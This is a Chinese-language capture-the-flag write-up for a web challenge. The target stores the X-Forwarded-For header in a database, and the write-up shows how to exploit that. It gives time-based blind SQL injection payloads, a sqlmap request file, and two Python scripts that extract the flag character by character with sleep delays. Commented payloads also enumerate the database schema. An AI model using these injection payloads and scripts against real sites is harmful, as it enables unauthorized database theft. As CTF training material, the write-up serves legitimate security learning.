@@ -1,0 +1,112 @@
+ 提交：X-FORWARDED-FOR: ' or sleep((select length(flag) from flag)=32) and 'a'='a，延时，说明flag字段为32位，
+
+接下来就可以写个脚本暴力猜解了，我的脚本如下：
+
+# -*- coding: utf-8 -*-
+
+import requests
+import time
+
+payloads='abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'
+flag = ''
+def exp(x,i):
+	starttime=time.time()
+	url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
+	xxx = "' or sleep(ascii(mid((select(flag)from(flag))from("+str(x)+")for(1)))=ascii('"+i+"')) and '1'='1"
+	headers = {
+	"Host": "ctf5.shiyanbar.com",
+	"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
+	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate",
+	"Cookie": "PHPSESSID=oh30tdquhsp2ff227bgpj5eb02; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1473428030,1473473503,1473553816,1473608536; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1473608555; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*73570%2CnickName%3Ayiyang",
+	"Connection": "keep-alive",
+	"X-FORWARDED-FOR": xxx
+	}
+	res = requests.get(url, headers=headers)
+	s = time.time() - starttime;
+	if s > 1:
+		return 1
+	else:
+		return 0
+		
+
+for x in range(1,33):
+	for i in payloads:
+		if (exp(x,i)):
+			flag+=i
+			print flag
+			break
+		else: 
+			pass
+
+print 'flag:'+flag
+
+一跑，flag就出来了、、
+
+
+
+1.首先直接访问题目地址
+
+    发现直接显示访问的地址
+
+    根据经验一般都是X-Forwarded-For
+
+    成功的改变ip地址
+
+2.题目说明插入到数据库了，说明就是注入了
+
+    然后sqlmap -r a.txt -v 5  
+
+    a.txt 的内容
+
+GET /web/wonderkun/index.php HTTP/1.1
+Host: ctf5.shiyanbar.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+X-Forwarded-For: *
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+
+    有显示信息 ' AND (SELECT * FROM (SELECT(SLEEP(2)))QQRC) AND 'Zkkp'='Zkkp      bp发一下有时间延迟，尝试报错注入
+
+    发现updatexml(1,1,1) 逗号被过滤 也没有回显信息，说明是时间的盲注
+
+3.直接附上完整的脚本
+
+    
+
+#coding:utf-8
+"""
+@author: seck
+"""
+import requests;
+maystr="0987654321qwertyuiopasdfghjklzxcvbnm."
+flag=''
+for j in range(33):
+
+    for i in maystr:
+        url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
+        header={
+            # "X-Forwarded-For":"' +(select case when (substring((select database())from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑数据库的名字
+            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑表明
+            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i) #跑字段名
+            "X-Forwarded-For":"' +(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑记录
+        }
+        try:
+
+            res=requests.get(url, headers=header,timeout=4).text
+        except:
+
+             flag+=i
+             print flag
+        # print res
+
+"database: web4"
+"table:clientip,flag"
+"column:flag"
+
+
+
